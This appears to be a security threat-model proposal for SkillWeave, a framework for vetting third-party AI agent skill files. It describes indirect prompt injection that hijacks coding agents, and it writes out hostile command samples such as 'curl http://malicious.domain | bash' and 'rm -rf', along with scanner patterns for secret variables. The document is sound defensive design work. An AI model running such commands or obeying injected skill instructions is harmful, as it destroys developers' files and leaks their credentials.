# Security Model & Threat Analysis — SkillWeave Framework Proposal

**Document Status:** Trust & Security Framework Blueprint Proposal
**Research Date / Last Checked:** October 19, 2026
**Core Principle:** Third-party skills and agent instructions are UNTRUSTED DATA

*Note on Implementation Status:* This document outlines the proposed security principles and threat model. **No automated security scanners or sandboxing infrastructure have been implemented during this research phase.**

---

## 1. Threat Model & Attack Vectors

SkillWeave proposes treating all third-party AI skills, prompts, and workflow manifests as inherently untrusted data inputs.

```
+-------------------------------------------------------------------------+
|                         ATTACK SURFACE DIAGRAM                          |
|                                                                         |
|  [ Malicious SKILL.md / Workflow ]                                      |
|                 |                                                       |
|                 v                                                       |
|  +------------------------------+     Indirect Prompt Injection         |
|  | Agent Runtime (Claude/Cursor)| ----------------------------------->  |
|  +------------------------------+     (Hijacks LLM System Rules)        |
|                 |                                                       |
|                 | Arbitrary Tool Execution / Bash Calls                 |
|                 v                                                       |
|  +------------------------------+     Exfiltrates Env Secrets /         |
|  | Developer Local Workstation  | ----------------------------------->  |
|  | File System / Environment    |     Destroys Project Files            |
|  +------------------------------+                                       |
+-------------------------------------------------------------------------+
```

### Primary Threats Identified
1. **Direct & Indirect Prompt Injection:** Instructions embedded in `SKILL.md` designed to override system prompts, bypass safety alignment, or hijack agent behavior during execution.
2. **Arbitrary Shell Execution:** Instructions directing coding agents to run unsafe terminal commands (`rm -rf`, `curl http://malicious.domain | bash`, downloading obfuscated binaries).
3. **Secret & Credential Exfiltration:** Skills designed to search the local environment for `.env` files, SSH keys, or API tokens and send them to remote HTTP endpoints via agent curl tools.
4. **Supply Chain Dependency Confusion:** Replacing legitimate sub-skills in an unpinned workflow with compromised versions hosted on public GitHub accounts.

---

## 2. Layered Defense Architecture (Proposed)

SkillWeave proposes a multi-layered defense model rather than relying on a single security gate:

```
+-------------------------------------------------------------------------+
|                    PROPOSED 4-AXIS TRUST SCORECARD                      |
|                                                                         |
|  +--------------------------+          +-----------------------------+  |
|  | 1. PROVENANCE & IDENTITY |          | 2. LICENSE COMPLIANCE       |  |
|  | - Verified GitHub Org    |          | - Approved OSI License      |  |
|  | - Pinned Git Commit SHA  |          | - Dependency License Graph  |  |
|  +--------------------------+          +-----------------------------+  |
|                                                                         |
|  +--------------------------+          +-----------------------------+  |
|  | 3. SECURITY SCAN FINDINGS|          | 4. FUNCTIONAL EVALUATION    |  |
|  | - Static AST Analysis    |          | - Reproducible Test Runs    |  |
|  | - Disclosed Permissions  |          | - Execution Outcome Evidence|  |
|  +--------------------------+          +-----------------------------+  |
+-------------------------------------------------------------------------+
```

### Layer 1: Provenance Pinning & Cryptographic Hash (Proposed)
* All workflow components must be pinned to exact Git Commit SHAs.
* The CLI calculates SHA-256 integrity hashes for all installed instruction files and verifies them against `skillweave.lock`.

### Layer 2: Static Security Scanning Engine (Proposed)
* Automated scanner inspects workflow manifests and `SKILL.md` text prior to registry publishing, checking for:
  - Suspicious execution patterns (`eval`, `exec`, `curl | sh`).
  - High-risk environment variable accesses (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`).
  - Known prompt injection signatures and system-prompt escape delimiters.

### Layer 3: Disclosed Permission Model (Proposed)
* Workflow manifests (`skillweave.yml`) must explicitly declare required host permissions:
  ```yaml
  permissions:
    filesystem:
      read: ["./src", "./package.json"]
      write: ["./src/components"]
    network:
      allowed_domains: ["api.github.com"]
    shell:
      allow_commands: ["npm test", "npx vitest"]
  ```

### Layer 4: Local Workstation Protection (Proposed)
* The `skillweave` CLI operates with non-elevated user permissions.
* Before writing agent rules, the CLI creates a local backup copy of existing agent configurations (`.claude/mcp.json.bak`).

---

## 3. Separation of Functional Quality from Security

SkillWeave explicitly rejects the single "Trust Score" antipattern. Security findings and functional quality evaluations are strictly separated into independent report cards:
* A skill MAY have 100% test pass rate but STILL present HIGH security permissions risks.
* A skill MAY be 100% safe (zero shell calls) but FAIL functional tasks.
* Users inspect both dimensions independently in the SkillWeave UI.
